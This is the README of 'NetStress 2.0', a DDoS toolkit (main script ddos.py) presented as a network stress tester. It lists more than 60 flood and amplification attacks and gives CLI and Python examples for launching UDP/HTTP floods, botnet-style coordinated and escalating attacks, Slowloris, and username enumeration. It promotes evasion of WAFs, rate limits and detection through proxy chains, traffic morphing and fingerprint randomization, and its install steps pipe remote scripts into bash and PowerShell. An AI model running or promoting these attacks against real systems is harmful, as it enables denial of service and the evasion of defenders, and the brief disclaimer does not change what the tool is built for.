# NetStress 2.0 "Power Trio"

The world's most powerful network stress testing framework using the Python/Rust/C "Power Trio" architecture for maximum performance with memory safety.

**Version 2.1.0** | **327+ Tests** | **60+ Attack Types** | **AI-Powered Optimization** | **100M+ PPS Capable**

## Latest Optimizations (v2.1.0)

### Performance Improvements

- **Native Rust Engine**: 400,000+ PPS peak performance
- **Optimized Python Fallback**: 220,000+ PPS (40% improvement)
- **Multi-socket per thread**: 4x sockets reduce lock contention
- **32MB socket buffers**: Maximum throughput optimization
- **Batch atomic updates**: 5000 packets per flush

### New Attack Vectors

- **Protocol Fuzzer**: Grammar-based mutations for vulnerability discovery
- **Advanced Slowloris**: Connection pooling with adaptive timing
- **DNS Amplification Engine**: Resolver discovery and query optimization
- **HTTP/2 Multiplexed Flood**: Stream-based attacks
- **R.U.D.Y. Attack**: Slow POST with large Content-Length
- **TCP State Manipulation**: Half-open, TIME_WAIT, FIN_WAIT attacks

### Advanced Evasion

- **Markov Chain Timing**: Unpredictable traffic patterns
- **Browser Mimicry**: Chrome, Firefox, Safari, Mobile patterns
- **Entropy-Maximizing Noise**: High-entropy payload variations
- **Real-time Defense Detection**: Rate limit, WAF, behavioral analysis

## Power Trio Architecture

NetStress 2.0 uses a revolutionary "Sandwich" architecture that combines the strengths of three programming languages:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         PYTHON LAYER (Brain)                                 │
│  ddos.py │ main.py │ CLI │ AI/ML │ Analytics │ Configuration │ Reporting   │
│                                                                              │
│  Responsibilities:                                                           │
│  • User interface (CLI, GUI)                                                │
│  • Configuration management                                                  │
│  • AI/ML optimization logic                                                  │
│  • Real-time visualization                                                   │
│  • Distributed coordination                                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│                         RUST LAYER (Engine)                                  │
│  netstress_engine (PyO3) │ Packet Gen │ Threading │ Lock-Free Queues        │
│                                                                              │
│  Responsibilities:                                                           │
│  • High-speed packet generation                                              │
│  • Memory-safe buffer management                                             │
│  • SIMD-accelerated checksums                                                │
│  • Rate limiting with nanosecond precision                                   │
│  • Thread pool management                                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                         C LAYER (Metal)                                      │
│  driver_shim.c │ DPDK │ AF_XDP │ io_uring │ sendmmsg │ Raw Sockets          │
│                                                                              │
│  Responsibilities:                                                           │
│  • Kernel bypass (DPDK, AF_XDP)                                              │
│  • Async I/O (io_uring)                                                      │
│  • Batch syscalls (sendmmsg)                                                 │
│  • Hardware checksum offload                                                 │
│  • Platform-specific optimizations                                           │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Layer Communication Flow

```
Python (ddos.py)                    Rust (netstress_engine)              C (driver_shim)
      │                                      │                                 │
      │  import netstress_engine             │                                 │
      │─────────────────────────────────────>│                                 │
      │                                      │                                 │
      │  engine.start_flood(config)          │                                 │
      │─────────────────────────────────────>│                                 │
      │                                      │  FFI: init_backend()            │
      │                                      │────────────────────────────────>│
      │                                      │                                 │
      │                                      │  FFI: send_batch(packets)       │
      │                                      │────────────────────────────────>│
      │                                      │<────────────────────────────────│
      │                                      │  return sent_count              │
      │                                      │                                 │
      │  stats = engine.get_stats()          │                                 │
      │<─────────────────────────────────────│                                 │
      │  {pps: 10M, gbps: 12.5, ...}         │                                 │
```

## Legal Notice

**⚠️ AUTHORIZED USE ONLY ⚠️**

This tool is for authorized security testing and performance evaluation only. You must have explicit written permission to test any target system. Unauthorized use against systems you do not own or have permission to test is illegal and may violate:

- Computer Fraud and Abuse Act (CFAA)
- Local cybersecurity laws
- Terms of service agreements

**Use responsibly. The authors assume no liability for misuse.**

## What This Tool Actually Does

NetStress 2.0 is a professional-grade network stress testing framework featuring:

- **Python/Rust/C "Power Trio" Architecture**: Python for orchestration, Rust for safe high-speed packet generation, C for hardware-level access
- **AI-Powered Optimization**: Genetic algorithms, reinforcement learning, and Bayesian optimization for attack parameter tuning
- **Real-Time Intelligence**: Defense detection, target profiling, and adaptive evasion
- **Multi-Vector Orchestration**: Phase-based attack progression with dynamic resource allocation
- **Production Ready**: 80+ automated tests, comprehensive logging, and enterprise configuration

## Honest Capabilities Assessment

### What This Tool ACTUALLY Does:

- ✅ Sends real UDP/TCP/HTTP packets using standard OS sockets
- ✅ Uses `sendfile()` and `MSG_ZEROCOPY` on Linux when available
- ✅ Uses `sendmmsg()` for batch UDP sending on Linux (with root)
- ✅ Applies real socket optimizations (SO_SNDBUF, TCP_NODELAY)
- ✅ Provides honest performance metrics from OS counters
- ✅ **Advanced Evasion**: Traffic shaping, protocol obfuscation, timing patterns
- ✅ **Distributed Testing**: Multi-machine coordination with controller/agent architecture
- ✅ **Reconnaissance**: Port scanning, service detection, OS/web fingerprinting
- ✅ **Anti-Detection**: Proxy chains, traffic morphing, behavioral mimicry, fingerprint randomization
- ✅ **Advanced Attacks**: 30+ attack types including amplification, Layer 7, SSL, protocol-specific

### Power Trio Native Engine

NetStress 2.0 includes a revolutionary **native Rust/C engine** that delivers unprecedented performance:

#### Rust Layer Features:

- ✅ **Memory Safety**: Zero buffer overflows, use-after-free, or memory leaks
- ✅ **SIMD Acceleration**: AVX2/SSE2 vectorized checksum calculation (2-4x faster)
- ✅ **Lock-Free Threading**: MPMC queues and atomic statistics for maximum CPU utilization
- ✅ **Precision Rate Limiting**: Nanosecond-precision token bucket (within 5% of target)
- ✅ **Pre-allocated Pools**: Slab allocator eliminates runtime memory allocation
- ✅ **Zero-Copy Operations**: PyO3 integration with minimal Python overhead

#### C Layer Features:

- ✅ **DPDK Integration**: Kernel bypass for 100M+ PPS (requires DPDK libraries)
- ✅ **AF_XDP Support**: Zero-copy UMEM buffers for 10M-50M PPS (Linux 4.18+)
- ✅ **io_uring Backend**: Async batch I/O for 1M-10M PPS (Linux 5.1+)
- ✅ **sendmmsg Batching**: Multi-packet syscalls for 500K-2M PPS (Linux 3.0+)
- ✅ **Hardware Offload**: Checksum and segmentation offload when available
- ✅ **Platform Optimization**: IOCP (Windows), kqueue (macOS), epoll (Linux)

#### Automatic Backend Selection:

The engine automatically detects and selects the best available backend:

1. **DPDK** → 2. **AF_XDP** → 3. **io_uring** → 4. **sendmmsg** → 5. **Raw Socket** → 6. **Python Fallback**

See [native/README.md](native/README.md) for build instructions and advanced configuration.

### What Pure Python Mode Does NOT Do:

- ❌ **XDP/eBPF**: No kernel-level packet processing (use native engine or [xdp-tools](https://github.com/xdp-project/xdp-tools))
- ❌ **DPDK**: No kernel bypass networking (use native engine or [DPDK](https://www.dpdk.org/))
- ❌ **Hardware acceleration**: No specialized NIC features or SR-IOV
- ❌ **Multi-gigabit performance**: Limited by Python interpreter and OS network stack
- ❌ **Raw packet crafting**: Limited raw socket support (requires root/admin)
- ❌ **Real-time guarantees**: Subject to Python GIL and OS scheduling

### Power Trio Performance Targets:

| Backend         | Target PPS | Target Bandwidth | Latency | Platform Support       |
| --------------- | ---------- | ---------------- | ------- | ---------------------- |
| **DPDK**        | 100M+      | 100+ Gbps        | < 1μs   | Linux (requires setup) |
| **AF_XDP**      | 10M-50M    | 40-100 Gbps      | < 10μs  | Linux 4.18+ (root)     |
| **io_uring**    | 1M-10M     | 10-40 Gbps       | < 100μs | Linux 5.1+             |
| **sendmmsg**    | 500K-2M    | 5-20 Gbps        | < 1ms   | Linux 3.0+             |
| **Raw Socket**  | 50K-500K   | 1-5 Gbps         | < 10ms  | All platforms          |
| **Pure Python** | 10K-50K    | 0.1-0.5 Gbps     | > 10ms  | All platforms          |

**Note:** Performance varies by hardware, network conditions, and target responsiveness. DPDK and AF_XDP require specific setup and privileges.

For detailed capabilities, run: `python ddos.py --status`

## Features

### Power Trio Core Architecture

- **Python Layer (Brain)**: User interface, configuration management, AI/ML optimization, real-time analytics, distributed coordination
- **Rust Layer (Engine)**: High-speed packet generation, memory-safe buffer management, SIMD acceleration, nanosecond-precision rate limiting, lock-free threading
- **C Layer (Metal)**: Kernel bypass (DPDK, AF_XDP), async I/O (io_uring), batch syscalls (sendmmsg), hardware checksum offload, platform-specific optimizations

### Attack Capabilities

- **50+ Attack Types**: TCP, UDP, HTTP, HTTPS, DNS, ICMP, Amplification, SSL, and more
- **Multi-Vector Orchestration**: Phase-based attacks with automatic escalation
- **Protocol Fuzzing**: Grammar and mutation-based fuzzing for HTTP, DNS, TCP
- **Botnet Simulation**: Coordinated multi-source attack patterns

### Intelligence & Optimization

- **AI Attack Optimizer**: Genetic algorithms, reinforcement learning, Bayesian optimization
- **Real-Time Intelligence**: Defense detection, target profiling, effectiveness scoring
- **Adaptive Rate Control**: PID-based rate adjustment with RTT measurement
- **Predictive Analytics**: Performance prediction and anomaly detection

### Evasion & Stealth

- **Advanced Evasion**: Traffic shaping, protocol obfuscation, timing manipulation
- **Anti-Detection**: Proxy chains, traffic morphing, behavioral mimicry
- **Defense Detection**: Automatic detection of WAF, rate limiting, DPI

### Infrastructure

- **Cross-platform**: Windows, Linux, macOS support
- **Distributed Testing**: Multi-machine coordination for large-scale testing
- **Built-in Safety**: Target validation, resource monitoring, emergency shutdown
- **Production Ready**: 80+ tests, comprehensive logging, enterprise configuration

## Quick Start

### Automated Installation (Recommended)

```bash
# Linux/macOS - Full Power Trio installation
curl -sSL https://raw.githubusercontent.com/Destroyer-official/-NetStress-/main/scripts/install.sh | bash

# Windows (PowerShell as Administrator)
iwr -useb https://raw.githubusercontent.com/Destroyer-official/-NetStress-/main/scripts/install.ps1 | iex
```

### Manual Installation

```bash
git clone https://github.com/Destroyer-official/-NetStress-.git
cd -NetStress-
pip install -r requirements.txt

# Build native engine for maximum performance (optional but recommended)
cd native/rust_engine
pip install maturin
maturin develop --release

# Test installation
python ddos.py --status
```

### Power Trio Build Options

```bash
# Quick build (auto-detect platform)
make build-native

# Platform-specific builds
make build-native-linux     # Linux with sendmmsg + io_uring
make build-native-windows   # Windows with IOCP
make build-native-macos     # macOS with kqueue

# Advanced Linux build (requires setup)
make build-native-full      # Linux with DPDK + AF_XDP + io_uring + sendmmsg
```

For detailed build instructions including DPDK and AF_XDP setup, see [BUILD_INSTRUCTIONS.md](docs/BUILD_INSTRUCTIONS.md).

## Supported Attack Types

### Basic Floods

| Protocol | Type    | Description          |
| -------- | ------- | -------------------- |
| TCP      | Flood   | TCP connection flood |
| UDP      | Flood   | UDP packet flood     |
| HTTP     | Layer 7 | HTTP request flood   |
| HTTPS    | Layer 7 | HTTPS request flood  |
| DNS      | Query   | DNS query flood      |
| ICMP     | Echo    | ICMP echo flood      |

### Connection-Level Attacks

| Attack                | Type | Description           |
| --------------------- | ---- | --------------------- |
| SYN Flood             | Raw  | TCP SYN flag flood    |
| ACK Flood             | Raw  | TCP ACK flag flood    |
| RST Flood             | Raw  | TCP RST flag flood    |
| FIN Flood             | Raw  | TCP FIN flag flood    |
| XMAS Flood            | Raw  | FIN+PSH+URG flags     |
| NULL Scan             | Raw  | No flags set          |
| Connection Exhaustion | TCP  | Hold connections open |

### Layer 7 Attacks

| Attack           | Type | Description                     |
| ---------------- | ---- | ------------------------------- |
| HTTP Flood       | L7   | High-volume HTTP requests       |
| Slowloris        | L7   | Slow header attack              |
| Slow POST (RUDY) | L7   | Slow body transmission          |
| Cache Bypass     | L7   | Unique requests to bypass cache |
| HTTP Smuggling   | L7   | Request smuggling attack        |

### Amplification Attacks

| Attack    | Factor | Description                       |
| --------- | ------ | --------------------------------- |
| DNS       | 28x    | DNS ANY query amplification       |
| NTP       | 556x   | NTP monlist amplification         |
| SSDP      | 30x    | UPnP SSDP amplification           |
| Memcached | 51000x | Memcached stats amplification     |
| Chargen   | 358x   | Character generator amplification |
| SNMP      | 6.3x   | SNMP GetBulk amplification        |

### SSL/TLS Attacks

| Attack            | Type | Description                    |
| ----------------- | ---- | ------------------------------ |
| SSL Exhaustion    | CPU  | Exhaust server with handshakes |
| SSL Renegotiation | CPU  | Force expensive renegotiations |
| THC-SSL-DOS       | CPU  | Combined SSL attack            |
| Heartbleed Test   | Vuln | CVE-2014-0160 detection        |

### Protocol-Specific Attacks

| Attack      | Protocol | Description            |
| ----------- | -------- | ---------------------- |
| DNS Flood   | DNS      | DNS query flood        |
| SMTP Flood  | SMTP     | SMTP command flood     |
| FTP Bounce  | FTP      | FTP PORT command abuse |
| MySQL Flood | MySQL    | MySQL connection flood |
| Redis Flood | Redis    | Redis command flood    |

### Application Attacks

| Attack             | Target    | Description             |
| ------------------ | --------- | ----------------------- |
| WordPress XMLRPC   | WordPress | Pingback amplification  |
| WordPress Login    | WordPress | Login bruteforce        |
| API Flood          | REST API  | API endpoint flood      |
| WebSocket Flood    | WebSocket | WebSocket message flood |
| GraphQL Deep Query | GraphQL   | Deeply nested queries   |
| GraphQL Batch      | GraphQL   | Batched query attack    |

### Advanced Timing Attacks

| Attack              | Type    | Description                       |
| ------------------- | ------- | --------------------------------- |
| Slow Rate           | Evasion | Below-threshold request rate      |
| Advanced Slowloris  | L7      | Enhanced connection holding       |
| Resource Exhaustion | Timing  | Time-based resource depletion     |
| Synchronized Pulse  | Timing  | Coordinated burst attacks         |
| Timing Side-Channel | Recon   | Information extraction via timing |

### Steganography & Covert Channels

| Method             | Type    | Description                   |
| ------------------ | ------- | ----------------------------- |
| LSB Encoding       | Image   | Least significant bit hiding  |
| Whitespace         | Text    | Invisible character encoding  |
| Unicode Homoglyphs | Text    | Character substitution        |
| Protocol Headers   | Network | Data in HTTP headers          |
| Timing Channels    | Covert  | Data encoded in packet timing |

### Botnet Simulation

| Feature          | Type    | Description                    |
| ---------------- | ------- | ------------------------------ |
| Bot Coordination | C2      | Simulated command & control    |
| Hierarchical C2  | C2      | Multi-tier botnet structure    |
| Attack Waves     | Pattern | Pulse, ramp, random patterns   |
| Bot Behavior     | Sim     | Realistic bot state management |

### Attack Chaining

| Feature            | Type | Description                    |
| ------------------ | ---- | ------------------------------ |
| Sequential Chains  | Flow | Step-by-step attack execution  |
| Parallel Chains    | Flow | Concurrent attack execution    |
| Conditional Chains | Flow | Response-based branching       |
| Escalation Chains  | Auto | Automatic intensity escalation |

## Usage

### Basic Usage

```bash
python ddos.py -i TARGET -p PORT -t PROTOCOL [OPTIONS]

Required:
  -i, --ip      Target IP or hostname
  -p, --port    Target port
  -t, --type    Protocol (TCP, UDP, HTTP, etc.)

Optional:
  -d, --duration    Duration in seconds (default: 60)
  -x, --threads     Worker threads (default: auto-detect)
  -s, --size        Packet size in bytes (default: 1472)
  --rate            Rate limit in PPS (default: unlimited)
  --backend         Force backend (auto, native, python)
  --status          Show system capabilities and status
```

### Power Trio Examples

```bash
# High-performance UDP flood with native engine
python ddos.py -i 192.168.1.100 -p 80 -t UDP -d 60 --backend native --rate 1000000

# HTTP flood with automatic backend selection
python ddos.py -i 192.168.1.100 -p 80 -t HTTP -x 8 -d 60

# Check Power Trio capabilities
python ddos.py --status

# Force Python-only mode (for comparison)
python ddos.py -i 192.168.1.100 -p 80 -t UDP --backend python
```

### Power Trio Python API

```python
from core.native_engine import UltimateEngine, EngineConfig, Protocol

# Create high-performance configuration
config = EngineConfig(
    target="192.168.1.100",
    port=80,
    protocol=Protocol.UDP,
    threads=0,  # Auto-detect CPU cores
    packet_size=1472,
    rate_limit=1000000,  # 1M PPS
    backend="auto",  # Auto-select best backend
    duration=60
)

# Use context manager for automatic cleanup
with UltimateEngine(config) as engine:
    import time
    time.sleep(10)
    stats = engine.get_stats()
    print(f"Current: {stats.pps:.0f} PPS, {stats.gbps:.2f} Gbps")
    print(f"Backend: {stats.backend}")

print(f"Final: {stats.packets_sent} packets sent")
```

### Backend Capabilities Check

```python
from core.native_engine import get_capabilities

caps = get_capabilities()
print(f"Platform: {caps.platform}")
print(f"Native engine: {caps.native_available}")
print(f"DPDK: {caps.has_dpdk}")
print(f"AF_XDP: {caps.has_af_xdp}")
print(f"io_uring: {caps.has_io_uring}")
print(f"sendmmsg: {caps.has_sendmmsg}")
print(f"Recommended backend: {caps.recommended_backend}")
```

## Advanced Evasion

NetStress includes sophisticated evasion techniques to bypass basic detection:

### Traffic Shaping Profiles

```python
from core.evasion import TrafficShaper, ShapingProfile, ShapingConfig

# Stealthy mode - low rate with high randomization
shaper = TrafficShaper(ShapingConfig(
    profile=ShapingProfile.STEALTHY,
    jitter_percent=0.3
))

# Burst mode - periodic bursts with quiet periods
shaper = TrafficShaper(ShapingConfig(
    profile=ShapingProfile.BURST,
    burst_size=100,
    burst_interval=2.0
))

# Human mimicry - simulate legitimate user patterns
shaper = TrafficShaper(ShapingConfig(
    profile=ShapingProfile.MIMICRY
))
```

### Protocol Obfuscation

```python
from core.evasion import ProtocolObfuscator, ObfuscationMethod, ObfuscationConfig

# XOR encoding
obfuscator = ProtocolObfuscator(ObfuscationConfig(
    method=ObfuscationMethod.XOR_ENCODE,
    xor_key=b'\x42\x13\x37'
))

# HTTP mimicry - wrap traffic as HTTP requests
obfuscator = ProtocolObfuscator(ObfuscationConfig(
    method=ObfuscationMethod.PROTOCOL_MIMICRY,
    mimic_protocol="http"
))

# Polymorphic encoding - different encoding each packet
obfuscator = ProtocolObfuscator(ObfuscationConfig(
    method=ObfuscationMethod.POLYMORPHIC
))
```

### Timing Patterns

- **CONSTANT**: Fixed interval
- **HUMAN**: Human-like with think time
- **POISSON**: Natural random events
- **RANDOM_WALK**: Gradually changing rate
- **PULSE**: On-off pattern
- **ADAPTIVE**: Adjusts based on target response

## Reconnaissance

NetStress includes comprehensive reconnaissance capabilities:

### Port Scanning

```python
from core.recon import TCPScanner, SYNScanner, UDPScanner, ScanConfig

# TCP Connect scan
config = ScanConfig(target='192.168.1.100', ports=list(range(1, 1025)))
scanner = TCPScanner(config)
results = await scanner.scan()
print(f"Open ports: {scanner.get_open_ports()}")

# SYN scan (requires root)
scanner = SYNScanner(config)
results = await scanner.scan()
```

### Service Detection

```python
from core.recon import ServiceDetector

detector = ServiceDetector('192.168.1.100')
services = await detector.detect_all([22, 80, 443, 3306])
for svc in services:
    print(f"Port {svc['port']}: {svc['service']} {svc['version']}")
```

### Fingerprinting

```python
from core.recon import OSFingerprint, WebFingerprint, TLSFingerprint

# OS fingerprinting
os_fp = OSFingerprint('192.168.1.100')
result = await os_fp.fingerprint()
print(f"OS: {result.os_name} (confidence: {result.confidence})")

# Web fingerprinting
web_fp = WebFingerprint('example.com', port=443, ssl=True)
result = await web_fp.fingerprint()
print(f"Server: {result.server}, CMS: {result.cms}, Framework: {result.framework}")

# TLS fingerprinting
tls_fp = TLSFingerprint('example.com')
result = await tls_fp.fingerprint()
print(f"Protocols: {result['protocols']}, Cipher: {result['cipher']}")
```

### Vulnerability Scanning

```python
from core.recon import VulnerabilityScanner, TargetAnalyzer

# Quick vulnerability scan
scanner = VulnerabilityScanner('192.168.1.100')
vulns = await scanner.scan([22, 80, 443, 3306, 6379])
for vuln in vulns:
    print(f"[{vuln['severity']}] {vuln['title']}")

# Comprehensive analysis
analyzer = TargetAnalyzer('example.com')
report = await analyzer.analyze(full_scan=True)
```

## Anti-Detection

NetStress provides advanced anti-detection capabilities:

### Proxy Chains

```python
from core.antidetect import ProxyChain, ProxyRotator, ProxyConfig, ProxyType

# Single proxy
proxy = ProxyConfig(host='proxy.example.com', port=1080, proxy_type=ProxyType.SOCKS5)

# Proxy chain (traffic goes through multiple proxies)
chain = ProxyChain([
    ProxyConfig(host='proxy1.example.com', port=1080, proxy_type=ProxyType.SOCKS5),
    ProxyConfig(host='proxy2.example.com', port=8080, proxy_type=ProxyType.HTTP),
])
reader, writer = await chain.connect('target.com', 80)

# Proxy rotation
rotator = ProxyRotator(proxies, strategy='best_latency')  # or 'round_robin', 'random'
reader, writer = await rotator.connect('target.com', 80)
```

### Traffic Morphing

```python
from core.antidetect import TrafficMorpher, MorphConfig, MorphType

# Make traffic look like HTTP
morpher = TrafficMorpher(MorphConfig(morph_type=MorphType.HTTP))
morphed_data = morpher.morph(attack_payload)

# Make traffic look like DNS
morpher = TrafficMorpher(MorphConfig(morph_type=MorphType.DNS))
morphed_data = morpher.morph(attack_payload)

# WebSocket framing
morpher = TrafficMorpher(MorphConfig(morph_type=MorphType.WEBSOCKET))
morphed_data = morpher.morph(attack_payload)
```

### Behavioral Mimicry

```python
from core.antidetect import BehavioralMimicry, BehaviorConfig, BehaviorProfile

# Simulate casual user behavior
mimicry = BehavioralMimicry(BehaviorConfig(profile=BehaviorProfile.CASUAL))
session = await mimicry.session_manager.create_session()

# Browse with realistic timing
await mimicry.browse_page(session, '/products', content_length=5000)
await mimicry.search(session, 'test query')
await mimicry.fill_form(session, {'username': 'test', 'password': 'test'})
```

### Fingerprint Randomization

```python
from core.antidetect import FingerprintRandomizer, JA3Randomizer, HeaderRandomizer

# Randomize browser fingerprint
fp_random = FingerprintRandomizer()
profile = fp_random.get_random_profile()
headers = fp_random.get_headers('target.com')

# Randomize JA3 TLS fingerprint
ja3_random = JA3Randomizer()
ja3 = ja3_random.generate_random_ja3()
print(f"JA3 Hash: {ja3_random.get_ja3_hash()}")

# Randomize HTTP headers
header_random = HeaderRandomizer()
headers = header_random.randomize_headers(base_headers)
headers = header_random.add_noise_headers(headers)
```

## Advanced Attack Features

### Botnet Simulation

```python
from core.attacks import BotnetController, HierarchicalBotnet, AttackWave, Command, CommandType

# Simple botnet simulation
controller = BotnetController(bot_count=50)
await controller.initialize()
await controller.start_all()

# Launch coordinated attack
await controller.launch_attack(
    target="192.168.1.100",
    port=80,
    duration=60,
    rate_per_bot=100,
    attack_type="http"
)

# Hierarchical botnet (multi-tier C2)
botnet = HierarchicalBotnet(regions=3, bots_per_region=20)
await botnet.initialize()
await botnet.coordinated_attack("192.168.1.100", port=80, stagger=0.5)

# Attack wave patterns
wave = AttackWave(controller)
await wave.pulse_attack("192.168.1.100", 80, pulses=5, pulse_duration=10)
await wave.ramp_attack("192.168.1.100", 80, start_rate=10, end_rate=1000)
```

### Attack Chaining

```python
from core.attacks import ChainBuilder, AttackChain, EscalationChain, ParallelChain

# Build attack chain with fluent API
chain = (ChainBuilder("recon_and_attack")
    .with_config(max_duration=300, stop_on_failure=False)
    .add_recon("192.168.1.100")
    .add_probe("192.168.1.100")
    .add_attack("192.168.1.100", attack_type="http", rate=1000)
    .build())

results = await chain.execute()

# Automatic escalation
escalation = EscalationChain("192.168.1.100", port=80)
results = await escalation.execute(target_impact=0.7)  # Escalate until 70% impact

# Parallel attack execution
parallel = ParallelChain(ChainConfig())
parallel.add_parallel_group([step1, step2, step3])  # Execute simultaneously
await parallel.execute()
```

### Steganography & Covert Channels

```python
from core.attacks import CovertChannel, StegoMethod, LSBEncoder, WhitespaceEncoder

# Create covert channel with encryption
channel = CovertChannel(method=StegoMethod.LSB, key=b"secret-key")

# Hide data in carrier
carrier = channel.generate_carrier(4096)
hidden = channel.hide(carrier, b"secret attack commands")
revealed = channel.reveal(hidden)

# Protocol header steganography
from core.attacks import ProtocolHeaderEncoder, StegoConfig
encoder = ProtocolHeaderEncoder(StegoConfig())
http_request = encoder.encode(b"", b"hidden payload")

# Timing-based covert channel
from core.attacks import TimingEncoder
timing = TimingEncoder(StegoConfig())
delays = timing.get_delays(b"secret data")  # Encode in packet timing
```

### Advanced Timing Attacks

```python
from core.attacks import SlowRateAttack, SlowlorisAdvanced, TimingSideChannel

# Slow rate attack (below detection threshold)
slow = SlowRateAttack("192.168.1.100", 80, requests_per_minute=10)
await slow.start(duration=300)

# Advanced slowloris with evasion
slowloris = SlowlorisAdvanced("192.168.1.100", 80, connections=200)
await slowloris.start(duration=300)

# Timing side-channel analysis
analyzer = TimingSideChannel("192.168.1.100", 80)
valid_users = await analyzer.detect_valid_usernames(
    ["admin", "root", "user", "test"],
    login_path="/login"
)
```

## Traffic Intelligence

```python
from core.intelligence import TrafficIntelligence, AnomalyDetector, ProtocolFingerprinter

# Comprehensive traffic analysis
intel = TrafficIntelligence()
result = intel.analyze_packet(
    data=packet_data,
    src_ip="192.168.1.1",
    dst_ip="10.0.0.1",
    src_port=12345,
    dst_port=80
)
print(f"Traffic type: {result['packet']['traffic_type']}")
print(f"Threat level: {result['threat_level']}")

# Anomaly detection
detector = AnomalyDetector()
for packet in packets:
    anomalies = detector.analyze(packet)
    if anomalies:
        print(f"Detected: {[a.anomaly_type.value for a in anomalies]}")

# Protocol fingerprinting
fp = ProtocolFingerprinter()
http_info = fp.fingerprint_http(response)
ssh_info = fp.fingerprint_ssh(banner)
tls_info = fp.fingerprint_tls(client_hello)
```

## Network Simulation

```python
from core.simulation import NetworkSimulator, NetworkCondition, NetworkTopology
from core.simulation import LoadBalancer, FirewallSimulator, TargetSimulator

# Simulate network conditions
sim = NetworkSimulator()
sim.set_profile(NetworkCondition.POOR)  # 150ms latency, 5% loss
success, data, latency = await sim.simulate_send(packet)

# Create network topology
topo = NetworkTopology()
topo.create_star_topology("switch", ["server1", "server2", "server3"])
path = topo.find_path("server1", "server3")
latency = topo.calculate_path_latency(path)

# Load balancer simulation
lb = LoadBalancer(algorithm="least_connections")
lb.add_backend("server1", weight=2)
lb.add_backend("server2", weight=1)
backend = lb.get_backend()

# Firewall simulation
fw = FirewallSimulator()
fw.add_rule("rate_limit", src_ip="*", rate_limit=100)
fw.block_ip("192.168.1.100")
allowed = fw.check_packet("192.168.1.1", 80)

# Target server simulation
target = TargetSimulator(max_rps=10000)
success, response_time, status = await target.handle_request()
print(f"Server health: {target.get_health()}")
```

## Advanced Reporting

```python
from core.reporting import ReportManager, ReportFormat

# Track attack and generate report
manager = ReportManager()
report_id = manager.start_attack("HTTP Flood", "192.168.1.100", 80)

# Record metrics during attack
for response in responses:
    manager.record_request(
        response_time_ms=response.time,
        bytes_sent=response.bytes_sent,
        status_code=response.status
    )

# Generate report
report = manager.end_attack(summary="Test completed successfully")

# Export in various formats
print(manager.export_report(report_id, ReportFormat.TEXT))
print(manager.export_report(report_id, ReportFormat.JSON))
print(manager.export_report(report_id, ReportFormat.HTML))
print(manager.export_report(report_id, ReportFormat.MARKDOWN))
```

## Distributed Testing

NetStress supports multi-machine coordination for large-scale testing:

### Controller (Main Machine)

```python
from core.distributed import DistributedController, ControllerConfig
from core.distributed import AttackCoordinator, CoordinatedAttack

# Start controller
controller = DistributedController(ControllerConfig(
    bind_port=9999,
    secret_key=b"your-secret-key"
))
await controller.start()

# Wait for agents to connect
coordinator = AttackCoordinator(controller)
await coordinator.wait_for_agents(count=3, timeout=60)

# Execute coordinated attack
attack = CoordinatedAttack(
    name="distributed_test",
    target="192.168.1.100",
    port=80,
    protocol="HTTP",
    duration=60,
    total_rate=100000,  # Distributed across all agents
    use_evasion=True,
    shaping_profile="stealthy"
)
results = await coordinator.execute_attack(attack)
```

### Agent (Worker Machines)

```python
from core.distributed import DistributedAgent, AgentConfig

agent = DistributedAgent(AgentConfig(
    controller_host="192.168.1.1",
    controller_port=9999,
    secret_key=b"your-secret-key"
))
await agent.start()
```

### Features

- **Synchronized Start**: All agents start simultaneously
- **Staggered Start**: Agents start with configurable delays
- **Multi-Phase Attacks**: Different settings per phase
- **Real-time Monitoring**: Aggregated statistics from all agents
- **Automatic Failover**: Handles agent disconnections gracefully

## Requirements

- Python 3.8+
- Dependencies: `pip install -r requirements.txt`
- Admin/root for raw packet protocols (TCP-SYN, ICMP, etc.)

## Important Limitations

### Performance Constraints

- **Python Interpreter Overhead**: ~10-100x slower than equivalent C/C++ tools
- **Global Interpreter Lock (GIL)**: Limits CPU-bound parallelism to single core
- **Memory Management**: Garbage collection can cause periodic latency spikes
- **Standard Network Stack**: Uses OS sockets, not kernel bypass (DPDK/XDP)

### Testing Limitations

- **Localhost Deception**: Tests against 127.0.0.1 measure memory copy speed, not network performance
- **Single Machine**: Cannot simulate distributed attacks or realistic traffic patterns
- **Resource Bounded**: Limited by your machine's CPU, memory, and network interface
- **OS Dependent**: Performance varies significantly between Windows, Linux, and macOS

### Realistic Use Cases

✅ **Good for:**

- Educational purposes and learning network protocols
- Basic load testing of development servers
- Proof-of-concept security demonstrations
- Understanding network behavior under stress

❌ **Not suitable for:**

- Production-grade performance testing (use iperf3, wrk, or commercial tools)
- Realistic DDoS simulation (use distributed testing frameworks)
- High-throughput benchmarking (use compiled tools like hping3)
- Advanced penetration testing (use specialized security tools)

## Project Structure

```
NetStress/
├── ddos.py           # Main script
├── main.py           # Entry point
├── core/             # Core modules
├── config/           # Configuration
├── docs/             # Documentation
└── tests/            # Tests
```

## Safety Features

- Target validation
- Resource monitoring
- Emergency shutdown (Ctrl+C)
- Audit logging

## Documentation

- [Quick Start](docs/QUICK_START.md)
- [Usage Guide](docs/USAGE.md)
- [Troubleshooting](docs/TROUBLESHOOTING.md)

## License

MIT License - see [LICENSE](LICENSE)

## Disclaimer

This is an educational tool for authorized testing only. The authors are not responsible for misuse. Users must comply with all applicable laws.
